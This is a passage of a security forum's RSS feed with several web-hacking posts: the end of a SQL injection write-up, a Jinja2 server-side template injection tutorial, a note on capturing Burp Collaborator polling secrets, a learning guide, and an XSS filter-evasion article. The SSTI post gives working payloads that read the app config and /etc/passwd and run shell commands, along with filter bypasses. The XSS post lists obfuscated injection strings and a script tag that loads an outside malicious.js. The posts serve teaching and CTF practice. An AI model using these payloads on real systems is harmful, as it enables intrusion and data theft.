    q = raw_input("~#:")
</code></pre>
<p>If you enjoyed the post, learnt something new, or have any feedback / improvements, make sure to follow me on Twitter (<a href="https://twitter.com/SecGus" rel="noopener nofollow ugc">https://twitter.com/SecGus</a>).</p>
<p>*If anyone has been able to successfully exfiltrate data via the ORDER BY clause in MySQL when the column name is hard-coded (like this <code>SELECT * FROM users WHERE name = "example" ORDER BY name USER-INPUT;</code>), I would love to know how, my DMs on here are always open, or you can reach me on twitter (see above), or via email at rat@outlook.at.</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122</link>
          <pubDate>Tue, 17 Dec 2019 13:57:21 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18122</guid>
          <source url="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</source>
        </item>
        <item>
          <title>Explaining Server Side Template Injections</title>
          <dc:creator><![CDATA[chivato]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hey, I am chivato, this is my first post on here and I hope it is of some use to people. Exploiting SSTI in strange cases will be the next post I make. Any and all feedback is appreciated &lt;3.</p>
<p><strong>Building the environment:</strong></p>
<p>We start with just a basic flask web application, written in python (I will be using python 2), which is as follows:</p>
<pre><code>from flask import *

app = Flask(__name__)

@app.route("/")
def home():
    return "Hello, World!"

if __name__ == "__main__":
    app.run(debug=True, host="localhost", port=1337)
</code></pre>
<p>This website will just return “Hello, World!” when visited. Now, we need to add parameters so we can interact with the web application. This can be done with the “requests” part of Flask, so we just add request.args.get(‘parameter name’). In my case the parameter will be called “name”, here is how our code should look:</p>
<pre><code>from flask import *

app = Flask(__name__)

@app.route("/")
def home():
	output = request.args.get('name')
    return output

if __name__ == "__main__":
    app.run(debug=True, host="localhost", port=1337)
</code></pre>
<p>But since this always returns the value in the get request, if you go to the website without a get parameter called name, you will get an error. To fix this I included a simple if statement:</p>
<pre><code>from flask import *

app = Flask(__name__)

@app.route("/")
def home():
        output = request.args.get('name')
        if output:
                pass
        else:
                output = "Empty"
        return output

if __name__ == "__main__":
    app.run(debug=True, host="localhost", port=1337)
</code></pre>
<p>Perfect, now we have a flask app that returns the value in the get parameter and doesn’t crash. Now to implement the vulnerability, the vulnerability consists of templates being executed on the side of the server, when we have control of what the template contains, for example a vulnerability was found in Uber by the famous bug hunter known as orange, it consisted of making your profile name follow the template syntax for jinja2 (which is {{template content}} for jinja2). and then when you received the email, the template had been executed. So, imagine you set {{‘7’*7}} as your username, when you receive the email, you will see “Welcome 7777777.”</p>
<p>As stated above, the vulnerability comes into play when the template is executed on the side of the server, and we control the input, so let’s make sure our input is rendered. This can be done with render_template_string from flask. This takes a string, and treats it as text that may have any templates in it, if it does, then it executes the template.</p>
<pre><code>from flask import *

app = Flask(__name__)

@app.route("/")
def home():
        output = request.args.get('name')
        output = render_template_string(output)
        if output:
                pass
        else:
                output = "Sp0re&lt;3"
        return output

if __name__ == "__main__":
    app.run(debug=True, host="localhost", port=1337)
</code></pre>
<p>As you can see, now, if you visit “<a href="http://localhost:1337/?name=%7B%7B%277%27*7%7D" rel="nofollow noopener">http://localhost:1337/?name={{‘7’*7}</a>}”, you will be welcomed with “7777777”. We now have our environment setup and ready to play with (later on I will be looking at some simple WAF bypass methods, but for now we are just leaving our script as this).</p>
<p><strong>Recongnising and exploiting the vulnerability:</strong></p>
<p>So template engines are used VERY widely nowadays, and they exist for a variety of different languages, such as PHP, JS, Python (obviously), ruby and many more. The base of why they are useful is in case you have a large website or platform, where not many details change between pages. For example, netflix, has the same layout for it’s content, and the only things that change are: title, description, banner and some other minor details, so instead of creating a whole page per show, they just feed the data to their templates, and then the engine puts it all together.</p>
<p>Template engines can be used for anything that follows that process of having to use the same thing tons of times, so in Uber’s example instead of making a new email every time, they had a single email template, and just changed in the name each time.</p>
<p>So, knowing that we can execute templates, what can we actually do with that, well, honestly a lot.</p>
<p><strong>&gt; Read the configuration.</strong></p>
<p>This can be used to grab the SECRET_KEY which is used to sign cookies, with this, you can create and sign your own cookies.</p>
<p>Example payload for Jinja2:<br>
<code>{{ config }}</code></p>
<p><strong>&gt; Read local files (LFR).</strong></p>
<p>This can be used to do a variety of things, ranging from directly reading a flag if it is held in the templates folder with a basic {% include ‘flag.txt’ %}, to reading any file on the system this can be via the RCE payload (see next point), or via an alternative.</p>
<p>An example payload of an alternative would be:<br>
<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code>  //May vary depending on version.</p>
<p><strong>&gt; Remote command execution (RCE).</strong></p>
<p>Finally, the remote command execution payload. Obviously the most severe and dangerous one, and can be done a variety of ways, one is going through the subclasses and finding the subprocess.Popen number:<br>
<code>{{''.__class__.mro()[1].__subclasses__()[ HERE IS WHERE THE NUMBER WOULD GO ]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
<p>Although I have had much more success with the following payload, which uses Popen without guessing the offset.<br>
<code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("whoami").read().zfill(417)}}{%endif%}{% endfor %}</code><br>
You may need to go to the end of the page to skip all the 0’s that are produced from that payload.</p>
<p>Now that some of the basic exploits are over, we can take a look at bypass methods. Let’s start with the parameter bypass method.</p>
<p>Imagine you have a template engine, in this case flask, that takes a value from a parameter and removes any “_” from it. This would restrict us from doing a variety of things, for example {{ __class__ }}. So, this bypass mehtod is based off of the idea that, only that parameter gets checked for the underscores. So all we have to do is pass the underscores via another parameter, and call them from our template injection.</p>
<p>We start with calling the class attribute from request (The waf would block the underscores).<br>
<code>{{request.__class__}}</code></p>
<p>Then, we remove the “.” and user the |attr to tell the template that we are using request’s attributes.<br>
<code>{{request|attr("__class__")}}</code></p>
<p>We pipe the whole content of the “attribute” parameter to a “join” function, which sticks all of the value together, in this case it would stick “<strong>", “class” and "</strong>” together, to create <strong>class</strong>.<br>
<code>{{request|attr(["__","class","__"]|join)}}</code></p>
<p>We then remove one of the underscores, and just multiply the single one by two, in python, using “[STRING]”*[NUMBER] will make a new string of the previously stated strings, that amount of times. So “test”*3 would be equal to “testtest”.<br>
<code>{{request|attr(["_"*2,"class","_"*2]|join)}}</code></p>
<p>Finally, we tell the paytload to get the underscores from the other parameter called “usc”, and we add the underscores to the other parameter, an example URL to use against our script would be:<br>
<code>http://localhost:1337/?name={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;usc=_</code><br>
This may just return Empty, since we set an if statement that basically stated if out rendered template is empty then just set the output to Empty.</p>
<p>Moving on to the next bypass method, this one is used to bypass the “[”, “]” being blocked, since they are needed for the payload stated above.</p>
<p>It is honestly just a syntax thing, but it manages to achieve the same thing, without having to use any “[”, “]”, or “_”.<br>
Some examples are:<br>
<code>http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_</code><br>
<code>http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</code><br>
These were pulled from an amazing page called “PayloadAllTheThings”, link can be found at the bottom of the article in the sources part.</p>
<p>Another one is in case “.” is blocked, and it uses the Jinja2 filters with |attr():<br>
<code>http://localhost:1337/?name={{request|attr([%22_%22*2,%22class%22,%22_%22*2]|join)}}</code></p>
<p>Finally, a bypass method that is used in case “[”, “]”, “|join” and / or “_” is blocked, since it uses none of the previously stated characters:<br>
<code>http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_</code></p>
<p>Now these are just the base bypass payloads, but can be combined and manipulated to achieve some amazing things.</p>
<p>Here is a payload I made myself to build a payload that leaks the config:<br>
<code>{{request|attr(["url",request.args.usc,"for.",request.args.usc*2,request.args.1,request.args.usc*2,".current",request.args.usc,"app.",request.args.conf]|join)}}&amp;1=globals&amp;usc=_&amp;link=url&amp;conf=config</code></p>
<p><strong>Conclusion:</strong><br>
This has just been a basic explanation of how to setup a website vulnerable to SSTI, how the exploitation works, and some basic bypass methods for any WAF’s that you may encounter. Also would like to shout out a moderator from HackTheBox called “makelaris”, since he was actually the one who sparked my interest for SSTI’s, and has taught me a lot about them. If this post is enjoyed and appreciated I will make more about more advanced SSTI exploitation cases, and also how SSTI’s may work and be exploited in other template engines.</p>
<p><strong>Sources:</strong></p>
<p>PayloadAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" rel="nofollow noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md</a><br>
pequalsnp-team: <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" rel="nofollow noopener">https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti</a><br>
A good HackTheBox retired machine that has an SSTI step: Oz (<a href="https://www.hackthebox.eu/home/machines/profile/152" rel="nofollow noopener">https://www.hackthebox.eu/home/machines/profile/152</a>)<br>
A writeup for Oz machine: <a href="https://0xdf.gitlab.io/2019/01/12/htb-oz.html" rel="nofollow noopener">https://0xdf.gitlab.io/2019/01/12/htb-oz.html</a><br>
More exploring SSTI’s: <a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html" rel="nofollow noopener">https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html</a><br>
Orange’s disclosed bug bounty report from Uber: <a href="https://hackerone.com/reports/125980" rel="nofollow noopener">https://hackerone.com/reports/125980</a></p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/explaining-server-side-template-injections/16297">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/explaining-server-side-template-injections/16297</link>
          <pubDate>Mon, 16 Sep 2019 20:31:15 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-16297</guid>
          <source url="https://0x00sec.org/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
        </item>
        <item>
          <title>Achieving Persistent Access to Burp Collaborator Sessions</title>
          <dc:creator><![CDATA[Cgboal]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <h3>What?</h3>
<h4>Summary</h4>
<p>This post details the steps required to achieve persistent access to Burp Collaborator sessions which are usually volatile, and lost when current instance of Burpsuite collaborator client is closed.</p>
<h4>Burpsuite Collaborator</h4>
<p>In case you are currently unaware of the collaborator client in Burpsuite, it allows you to generate collaborator links and monitor DNS, HTTP, and SMTP interactions made by external services. This is an excellent feature which greatly simplifies testing for vulnerabilities such as Server-Side Request Forgery (SSRF), Blind-XSS, and various other issues which may cause external service interactions.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/34c92c52537e14516a0734c4a4ce9b5483734716.png" alt="example" data-base62-sha1="7wXQ4BRCENUb0uepWofpG4GPRjw" width="690" height="331"></p>
<h3>Why?</h3>
<p>Whilst attempting to re-create the research pipeline described by James Kettle, in the whitepaper <a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface" rel="noopener nofollow ugc">cracking the lens</a>, and integrate it into my enumeration/scanning tool Ardent (which I will release here another time). I was faced with a choice of rolling my own interaction server, or living with the limitations imposed by collaborator, in that, manually generated links are only usable as long as the collaborator client is open, and do not survive exiting Burp. As the latter was unfeasible due to my goals of scanning a large range of targets over an extended period of time, I decided to see if I could piggyback off Burp collaborator in a less obvious way before taking the plunge and implementing my own solution.</p>
<p>Initially, I found that you can run your own collaborator server, which I recommend if you follow this guide as to not piss off PortSwigger. However, even when using your own Collaborator server, there is not an obvious way to interact with it outside BurpSuite. Which leads me to the following…</p>
<h3>How?</h3>
<h4>Theory</h4>
<p>Through some research I discovered that in order to maintain a simple stateful collaborator implementation, they generate the collaborator subdomains using a key derivation function based on a secret key. This secret key is generated by the Burp collaborator client when you open it, and subsequently destroyed when you close it.</p>
<p>When polling for interactions, Burp’s collaborator server regenerates the list of collaborator domains from the secret key, and returns the interactions it has recorded against that subdomain. Thus, it is possible to capture a Collaborator secret, and use it to poll for interactions made against links generated from that secret key.</p>
<h4>Methodology</h4>
<p>To begin with, we must find a way to intercept a polling request from BurpSuite, to the Burp Collaborator server. As this is a HTTP based protocol, you can use two instances of BurpSuite to achieve this. However, it’s probably easier to use wireshark.</p>
<p>However, before we are able to capture the polling request sent by BurpSuite to collaborator, we must first go to <code>Project Options-&gt;misc</code>, and set Collaborator to poll over HTTP.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/619d4c7ea82d3f0e3eb0ea89e703cf98714225ed.png" alt="over_http" data-base62-sha1="dVxkchdomSLRCyIXagtDVr0mNit" width="687" height="500"></p>
<p>Once this has been achieved, and wireshark is listening on the appropriate interface, go to <code>Burp-&gt;Collaborator Client</code> and press <code>Poll now</code>. In wireshark, you should now see a HTTP request to <code>http://polling.burpcollaborator.net/burpresults?biid=SECRET_KEY_HERE</code>. Take note of the secret key value sent as the value of the <code>biid</code> parameter.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2776ea6edba87fe2fccb85b39c91f164d5f6f4f5.png" alt="wireshark" data-base62-sha1="5D7oCK3Hv0rEqvq7MGvcX8sFdLD" width="690" height="341"></p>
<p>Now, it’s time to get some links to use with this secret in future. To do so, generate however many links you think you may need, and save them somewhere, along with the secret key.</p>
<p>It is now possible to retrieve interactions with any one of the generated collaborator links by sending a HTTP GET request to <code>http://polling.burpcollaborator.net/burpresults?biid=SECRET_KEY_HERE</code>. As the collaborator server generates the links using the secret key, they will never expire. However, the Burp collaborator server is ephemeral and thus may lose data if it is left there for prolonged periods. As such, it is recommended you poll regularly to collect your data.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a61a01b4bc5bf5e453845d4e11f80ee785c452a5.png" alt="demo" data-base62-sha1="nHoYHIATmlmFvq2HheibG022b1H" width="690" height="179"></p>
<h4>Conclusion</h4>
<p>I hope this helps the researchers out there in some way, and if you haven’t already, I highly recommend watching James Kettle’s talk “cracking the lens” and messing about with it yourself, it’s bizarre some of the interactions you can get from services by placing links in weird places. Figuring out why you have so many pingbacks for China when you never sprayed there will keep you busy for a while ;).</p>
            <p><small>15 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/achieving-persistent-access-to-burp-collaborator-sessions/14311">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/achieving-persistent-access-to-burp-collaborator-sessions/14311</link>
          <pubDate>Tue, 11 Jun 2019 19:47:23 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14311</guid>
          <source url="https://0x00sec.org/t/achieving-persistent-access-to-burp-collaborator-sessions/14311.rss">Achieving Persistent Access to Burp Collaborator Sessions</source>
        </item>
        <item>
          <title>Short &amp; simple guide on attacking Web Security</title>
          <dc:creator><![CDATA[escrow]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hey 0x00ers,</p>
<p>Throughout all the posts I’ve lurked on, I’ve realised that a lot of people lack knowledge within the Web Security sector and they wouldn’t mind learning it - as it is pretty fun. Now, this thread will include a variety of different links, and it will be talking about Web Security from an attacker’s point of view and not a defender. I will supply you with all the materials I use that are really good to read and use. Of course, if you have any other materials then post below so that it makes it easier for other people to learn <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>The first thing I did was look at what attack types there are within the Web Security sector, and the website I chose for this is <a href="https://www.owasp.org/index.php/Category:Attack" rel="noopener nofollow ugc">https://www.owasp.org/index.php/Category:Attack</a> purely because it’s one of the good ones out there if not, the best.</p>
<p>After I was familiar with certain attack types (such as XSS, CSRF, IDOR, SQLi, and more) I decided to download Burp Suite as it is a tool that has the ability to crawl for endpoints, allow you to send multiple requests to specific websites and endpoints, allows you to view the response in HTML format from that request, allows you to bruteforce simultaneously and so on. It’s the best tool that I have ever used and I wouldn’t hesitate paying for the Pro version. However, I’m not attempting to write a review on Burp so let’s move on.</p>
<p>After I was familiar with attack types &amp; the use of Burp I decided to participte in CTF’s and hacking boxes and doing web challenges that are on <a href="https://hackthebox.eu" rel="noopener nofollow ugc">https://hackthebox.eu</a> and CTF’s like <a href="https://ctf.hacker101.com/" rel="noopener nofollow ugc">https://ctf.hacker101.com/</a> and <a href="https://picoctf.com" rel="noopener nofollow ugc">https://picoctf.com</a></p>
<p>After I played around with the boxes and challenges, I still wanted to learn more as the journey isn’t finished (p.s: and it never will be, for anyone). I decided to start reading writeups as a lot of people attack websites differently whether it’s the use of programs, methods or filtering. A good website for reading writeups is <a href="https://pentester.land/list-of-bug-bounty-writeups.html" rel="noopener nofollow ugc">https://pentester.land/list-of-bug-bounty-writeups.html</a> which includes a ton of them. Reading writeups is a thing that every pentester / bug bounty hunter should do as it lets you know about attacking an input field in ways you might’ve not known, or how to deal with a bit of filtering and such.</p>
<p>I’m for sure not a professional, but this was only a short guide to get people started off within the Web Security sector on the attacking side. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>If you have anything to add, don’t hesitate to comment!</p>
            <p><small>5 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/short-simple-guide-on-attacking-web-security/13020">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/short-simple-guide-on-attacking-web-security/13020</link>
          <pubDate>Mon, 15 Apr 2019 13:06:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-13020</guid>
          <source url="https://0x00sec.org/t/short-simple-guide-on-attacking-web-security/13020.rss">Short &amp; simple guide on attacking Web Security</source>
        </item>
        <item>
          <title>[FUN] Bypass XSS Detection WAF</title>
          <dc:creator><![CDATA[th3law]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Basically sad life like dog bite, a scary world. Sorry for my English.</p>
<p>A little simple knowledge for everyone.</p>
<p>This article focuses on WAF’s ability to bypass the ability to detect Cross Site Scripting (XSS).</p>
<p>The follow:</p>
<ul>
<li>
<p>Determining payload structure: Determining various payload structures for a given context provides a precise idea of the optimal testing approach.</p>
</li>
<li>
<p>Probing: Probing, involves testing various strings against the target’s security mechanisms.</p>
</li>
<li>
<p>Obfuscation: obfuscation/other tweaks payload if required.</p>
</li>
</ul>
<p>The returned responses will help us analyze the assumptions about the solution used.</p>
<h3>I/Introduction</h3>
Cross-Site Scripting (XSS) attacks are a type of injection. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
<h3>II/HTML</h3>
Inside Tag:
<pre>&lt;input type="text" value="$input"&gt;</pre>
Outside Tag:
<pre> &lt;span&gt;You entered $input&lt;/span&gt;</pre>
<ul>
 	<li><strong>Outside Tag: primary character for starting an HTML tag</strong></li>
</ul>
According to the HTML specification, a tag name must start with an alphabet
<p>=&gt; the information can be used to determine the Regex match the tag name.</p>
<pre>&lt;dEv - If fails, &lt;[a-zA-Z]+ 
&lt;d3V - If fails, &lt;[a-zA-Z0-9]+ 
&lt;d|3v - If fails, &lt;.+
&lt;svg - If passes, no tag checking is in place
&lt;dev - If fails,&lt;[a-z]+
x&lt;dev - If passes,^&lt;[a-z]+</pre>
<p>Without any of allowed by the security mechanism, it is almost impossible bypass. Such filtering rules are not preferred due to high false positives.</p>
<p>If unblock, a number payload schemes -&gt; new payload created.</p>
<p><strong><span class="hashtag">#1</span></strong></p>
<pre>&lt;{tag}{filler}{event_handler}{?filler}={?filler}{javascript}{?filler}{&gt;,//,Space,Tab,LF}</pre>
<p>Once an appropriate {tag} found -&gt; Predictive regular expressions are used to match filler between tag and event handler.</p>
<pre>&lt;tag%0axxx - if fails, [\s\n]+
&lt;tag%0dxxx&gt; - If fails, [\s\n\r+]+
&lt;tag/~/xxx - If fails, .+
&lt;tag xxx - If fails, {space}
&lt;tag%09xxx - if fails, [\s]
&lt;tag%09%09xxx - if fails, \s+
&lt;tag/xxx - If fails, [\s/]+
</pre>
<p>Event handling is one of the most important parts of the payload structure.</p>
<p>Usually it will be combined with a regular Regex</p>
<pre>on\w+</pre>
<p>or blacklist</p>
<pre>on(load|click|error|show)</pre>
<p>The first regular expression is very limited and cannot bypass, while blacklist are often bypass by using lesser known event handlers that may no t in blacklist.</p>
<pre>&lt;tag{filler}onxxx - If fails, on\w+. If passes, on(load|click|error|show)
&lt;tag{filler}onclick - If passes, no event handler checking regular expression is in place</pre>
<p>If the regular expression to be ’ on\w+’ this expression cannot bypass because all event handlers start with on =&gt; next payload scheme.</p>
<p>If the regular expression follows the blacklist, we will find event handlers that are not blacklisted. If all event handlers are blacklisted -&gt; next payload scheme.</p>
<p>Example:</p>
<pre>onauxclick
ondblclick
oncontextmenu
onmouseleave
ontouchcancel</pre>
<p>The testing of fillers to = is similar filler earlier and should be only tested if ‘&lt;tag{filler}{event_handler}=d3v’ =&gt; blocked by the security mechanism.</p>
<p>The next component JavaScript to be executed. This is the part of the payload, but making regular expression assumptions used to match it is not required because JavaScript code is arbitrary and therefore cannot match predefined patterns.</p>
<p>=&gt; Point in now, all components of the load are put together and payload only needs to be closed</p>
<pre>&lt;payload%0a 
&lt;payload%0d 
&lt;payload%09
&lt;payload&gt;
&lt;payload
&lt;payload{space}
&lt;payload//</pre>
<p>HTML specification allows</p>
<pre>&lt;tag{white space}{anything here}&gt;</pre>
<p>which indicates that an HTML tag such as</p>
<pre>&lt;a href='http://example.com' any text can be placed here as long as there's a greater-than sign somewhere later in the HTML document&gt;</pre>
<p>is valid. This attribute of HTML tags helps an attacker to inject HTML tags in the ways mentioned above.</p>
<p><strong><span class="hashtag">#2</span></strong></p>
<pre>&lt;sCriPt{filler}sRc{?filler}={?filler}{url}{?filler}{&gt;,//,Space,Tab,LF}</pre>
<p>Testing similar to the previous payload scheme. That ? can be used at the end of the URL (if the filler is not used after the URL) instead of ending the tag.</p>
<p>Character follows ? will be considered part of the URL until &gt; is encountered. With &lt;script&gt; tags, most security rules can be detected.</p>
<p>&lt;object&gt; tags can be created payload using the same payload scheme:</p>
<pre>&lt;obJecT{filler}data{?filler}={?filler}{url}{?filler}{&gt;,//,Space,Tab,LF}</pre>
<p><strong><span class="hashtag">#3</span></strong></p>
<p>Two variants:</p>
<ul>
 	<li>Plain</li>
 	<li>Obfuscatable</li>
</ul>
Simple variants combined by patterns like
<pre>href[\s]{0,}=[\s]{0,}javascript:.</pre>
Its structure:
<pre>&lt;A{filler}hReF{?filler}={?filler}JavaScript:{javascript}{?filler}{&gt;,//,Space,Tab,LF}</pre>
Obfuscatable payload variant structure:
<pre>&lt;A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{&gt;,//,Space,Tab,L
F}</pre>
Difference is <strong>{special}</strong> component as well as the <strong>{quote}</strong><strong>.</strong>
<p><strong>{special}</strong> ref to an obfuscated version:</p>
<pre>j%0aAv%0dasCr%09ipt:
J%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0aT%0a:
J%0aa%0dv%09a%0as%0dc%09r%0ai%0dp%09T%0d%0a:</pre>
<p>In some cases, numeric character encoding can also be used to evade detection. As well as decimal and hexadecimal can be used.</p>
<pre>&amp;#74;avascript&amp;colon;
jav&amp;#x61;&amp;#115;cript:</pre>
<p>Two techniques of obfuscation can be used together if needed</p>
<pre>&amp;#74;ava%0a%0d%09script&amp;colon;</pre>
<h3>Exe and Non</h3>
Can be divided into Execution and Non-exe based on whether the injected load can be executed without any special assistance. Non-exe occurs when the input gets reflected within a HTML comment
<pre> &lt;--$input--&gt;</pre>
or between the following tags
<pre>&lt;style&gt;
&lt;title&gt;
&lt;noembed&gt;
&lt;template&gt;
&lt;noscript&gt;
&lt;textarea&gt;</pre>
These tags must be closed to execute payload. The only difference between executable and  non-exe is the test of {closing tag} component.
<pre>&lt;/tag&gt;
&lt;/tAg/x&gt;
&lt;/tag{space}&gt;
&lt;/tag//&gt;
&lt;/tag%0a&gt;
&lt;/tag%0d&gt;
&lt;/tag%09&gt;</pre>
If closing tag scheme is discovered
<pre>{closing tag}{any payload from executable payload section}</pre>
=&gt; can used for successful injection.
<h5>Inside Tag</h5>
Primary character is the quote used to enclose the attribute value.
<p>Example: input</p>
<pre>&lt;input value="$input" type="text"&gt;</pre>
<p>-&gt; Primary character "</p>
<p>In some cases, primary character is not required to break out.</p>
<h5>Event Handler</h5>
Input reflected as the value of src attribute of script/iframe tag:
<pre>&lt;script src="$input"&gt;</pre>
=&gt; malicious script/web phishing..etc can be loaded directly
<pre>&lt;script src="http://domain.com/malicious.js"&gt;</pre>
<h5>Bypass URL Matching Regular Expressions</h5>
<pre>//example.com/xss.js bypasses http(?s)://
////////example.com/xss.js bypasses (?:http(?s):?)?//
/\///\\/example.com/xss.js bypasses (?:http(?s):?)?//+</pre>
<h6>srcdoc</h6>
Input reflected as the value of srcdoc attribute of iframe tag:
<pre>&lt;iframe srcdoc="$input"&gt;</pre>
an escaped (HTML entities) HTML document can be supplied as the payload
<pre>&lt;iframe srcdoc="&amp;lt;svg/onload=alert()&amp;gt;"&gt;</pre>
<h6>Generic Attributes</h6>
All of the above cases do not require any bypassing techniques, except the last case can be omitted using the techniques used in the HTML context.
<pre>&lt;input type="text" value=""/onfocus="alert()$input"&gt;</pre>
We have two categories based on the interactivity of the concerned tag:
<p><strong>Interactable</strong></p>
<p>Input reflected in the tags can interact (clicking, hovering, focusing etc.,) only a quote is needed to break out.</p>
<pre>{quote}{filler}{event_handler}{?filler}={?filler}{javascript}</pre>
<p>Checking with WAF blocked using:</p>
<pre>x"y</pre>
<p>Event handler an important role here because this is the only component that possible detected by WAF. Each tag supports some event handlers and is up to the user to search for such cases, but there are some event handlers that can be linked to any of the tags:</p>
<pre>onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onclick
onauxclick
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart</pre>
<p><strong>Intractable</strong></p>
<p>Breakout of the tag is required to execute the payload if input reflected within a tag which cannot be interacted.</p>
<pre>{quote}&gt;{any payload scheme from html context section}</pre>
<h5>JavaScript</h5>
<strong> String Variable</strong>
<p>The most common is reflection within a string variable. This is common because developers usually assign user input to a variable instead of using them directly</p>
<pre>var name = '$input';</pre>
<ul>
 	<li>
<pre>{quote}{delimiter}{javascript}{delimiter}{quote}</pre>
Where delimiter are usually JavaScript operators like ^.
<p>If user input in a single quoted string variable:</p>
</li>

</ul>
<pre>'%{javascript}%'
'|{javascript}|'
'&lt;{javascript}&lt;'
'&gt;{javascript}&gt;'
'^{javascript}^'
'*{javascript}*'
'+{javascript}+'
'/{javascript}/'</pre>
<ul>
 	<li>
<pre>{quote}{delimiter}{javascript}//</pre>
Use a single line comment to comment the rest of the code in line to valid syntax.</li>
</ul>
<pre>'&lt;{javascript}//'
'|{javascript}//'
'^{javascript}//</pre>
<strong>BLOCKS</strong>
<p>Example</p>
<pre> if (a &gt; b){
 xnxx_func('<strong>');}}alert();if(true){('</strong>');
 }</pre>
<p>First <strong>}</strong> close block</p>
<p>Second <strong>}</strong> dummy func  as test</p>
<p><strong>alert();</strong> dummy function as test</p>
<p><strong>if(true){</strong> starts an if condition block to syntax valid.</p>
<p><strong>(’</strong> combines with remains of function.</p>
<p>The payload structure depends on the code itself and this uncertainty makes it difficult to detect (can add obfuscated).</p>
<pre>');%0a}%0d}%09alert();/*xnxx.com*/if(true){//xnxx.com%0a('</pre>
<pre> &lt;/scRipT{?filler}&gt;{html xnxx.com}</pre>
<p>can be used to break out and execute payload but easily detected.</p>
<h5>Finally, testing in process hunter bug.</h5>
<pre>Name: <a href="https://modsecurity.org/" rel="noopener nofollow ugc">ModSecurity</a>
Name: <a href="https://www.wordfence.com/" rel="noopener nofollow ugc">Wordfence</a>
Name: <a href="https://www.cloudflare.com/" rel="noopener nofollow ugc">Cloudflare</a>
Name: <a href="https://www.akamai.com/" rel="noopener nofollow ugc">Akamai</a>
Name: Comodo
Name: F5
<p>There are many other firewall providers that I cannot provide publicly.<br>
Sorry I cannot provide payload POC.<br>
Original post: <a href="https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e" rel="noopener nofollow ugc">https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e</a></p>
</pre>
https://medium.com/secjuice/waf-evasion-techniques-718026d693d8
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
